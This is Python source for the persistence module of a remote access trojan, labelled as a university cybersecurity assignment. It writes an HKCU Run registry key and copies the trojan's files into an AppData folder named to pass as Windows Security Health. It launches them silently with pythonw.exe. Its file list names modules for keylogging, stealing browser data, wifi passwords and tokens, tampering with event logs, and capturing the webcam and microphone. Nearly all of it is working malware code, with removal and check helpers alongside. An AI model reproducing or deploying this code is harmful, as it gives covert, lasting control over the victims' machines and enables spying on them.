"""
Persistence Module - Registry Run Key
MITRE ATT&CK: T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys)
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

Installs persistence via HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
so the RAT auto-starts when the user logs in. Uses HKCU (no admin needed).
Mimics Windows Defender naming for stealth.
"""

import os
import sys
import shutil
import winreg
from config import PERSISTENCE_NAME, RAT_NAME


# Where to copy RAT files for persistence
PERSIST_DIR = os.path.join(
    os.environ.get("APPDATA", ""),
    "Microsoft", "WindowsSecurityHealth"
)

# Registry key path
REG_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"

# Files needed for the RAT to run
RAT_FILES = [
    "rat_client.py", "config.py", "system_info.py", "file_recon.py",
    "screenshot.py", "keylogger.py", "crypto_utils.py", "evasion.py",
    "persistence.py", "clipboard_monitor.py", "browser_data.py",
    "privilege_check.py", "wifi_stealer.py", "token_harvester.py",
    "network_recon.py", "lateral_recon.py", "event_log_tamper.py",
    "webcam_capture.py", "microphone_capture.py", "scheduled_task_persist.py",
    "usb_monitor.py", "geolocation.py", "process_injection_demo.py",
    "email_harvester.py",
]


def install_persistence():
    """
    Install persistence: copy RAT files to AppData and set registry Run key.
    Uses pythonw.exe for no-console execution on reboot.

    Returns:
        True if persistence installed successfully, False otherwise
    """
    try:
        # Step 1: Create hidden directory in AppData
        os.makedirs(PERSIST_DIR, exist_ok=True)

        # Step 2: Copy RAT files to persistence directory
        source_dir = os.path.dirname(os.path.abspath(__file__))
        copied = 0
        for fname in RAT_FILES:
            src = os.path.join(source_dir, fname)
            dst = os.path.join(PERSIST_DIR, fname)
            if os.path.exists(src):
                shutil.copy2(src, dst)
                copied += 1

        # Step 3: Find pythonw.exe for no-console execution
        python_dir = os.path.dirname(sys.executable)
        pythonw = os.path.join(python_dir, "pythonw.exe")
        if not os.path.exists(pythonw):
            # Fallback to regular python if pythonw not found
            pythonw = sys.executable

        # Step 4: Write registry Run key
        reg_value = f'"{pythonw}" "{os.path.join(PERSIST_DIR, "rat_client.py")}"'

        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REG_KEY_PATH,
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, PERSISTENCE_NAME, 0, winreg.REG_SZ, reg_value)
        winreg.CloseKey(key)

        print(f"[+] Persistence installed: {PERSISTENCE_NAME}")
        print(f"    Directory: {PERSIST_DIR}")
        print(f"    Registry: HKCU\\{REG_KEY_PATH}\\{PERSISTENCE_NAME}")
        print(f"    Files copied: {copied}")
        return True

    except Exception as e:
        print(f"[-] Persistence installation failed: {e}")
        return False


def remove_persistence():
    """
    Remove persistence: delete registry key and cleanup directory.
    For demo teardown / cleanup.

    Returns:
        True if cleanup successful, False otherwise
    """
    removed_reg = False
    removed_dir = False

    # Remove registry key
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REG_KEY_PATH,
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, PERSISTENCE_NAME)
        winreg.CloseKey(key)
        removed_reg = True
        print(f"[+] Registry key removed: {PERSISTENCE_NAME}")
    except FileNotFoundError:
        print(f"[*] Registry key not found (already clean)")
        removed_reg = True
    except Exception as e:
        print(f"[-] Failed to remove registry key: {e}")

    # Remove persistence directory
    try:
        if os.path.exists(PERSIST_DIR):
            shutil.rmtree(PERSIST_DIR)
            removed_dir = True
            print(f"[+] Directory removed: {PERSIST_DIR}")
        else:
            print(f"[*] Directory not found (already clean)")
            removed_dir = True
    except Exception as e:
        print(f"[-] Failed to remove directory: {e}")

    return removed_reg and removed_dir


def check_persistence():
    """
    Check if persistence is currently installed.

    Returns:
        dict with 'installed' bool and details
    """
    result = {"installed": False, "registry_value": None, "directory_exists": False}

    # Check registry
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REG_KEY_PATH,
            0,
            winreg.KEY_READ
        )
        value, _ = winreg.QueryValueEx(key, PERSISTENCE_NAME)
        winreg.CloseKey(key)
        result["registry_value"] = value
        result["installed"] = True
    except FileNotFoundError:
        pass
    except Exception:
        pass

    # Check directory
    result["directory_exists"] = os.path.exists(PERSIST_DIR)

    return result


if __name__ == "__main__":
    print("=" * 50)
    print("  Persistence Module Test")
    print("=" * 50)

    # Check current state
    status = check_persistence()
    print(f"\n[*] Current state: {'INSTALLED' if status['installed'] else 'NOT installed'}")
    if status["registry_value"]:
        print(f"    Registry value: {status['registry_value']}")
    print(f"    Directory exists: {status['directory_exists']}")

    if not status["installed"]:
        print("\n[*] Installing persistence...")
        install_persistence()

        # Verify
        status = check_persistence()
        print(f"\n[*] Verification: {'INSTALLED' if status['installed'] else 'FAILED'}")
    else:
        print("\n[*] Persistence already installed. Removing...")
        remove_persistence()

        # Verify removal
        status = check_persistence()
        print(f"\n[*] Verification: {'REMOVED' if not status['installed'] else 'STILL PRESENT'}")
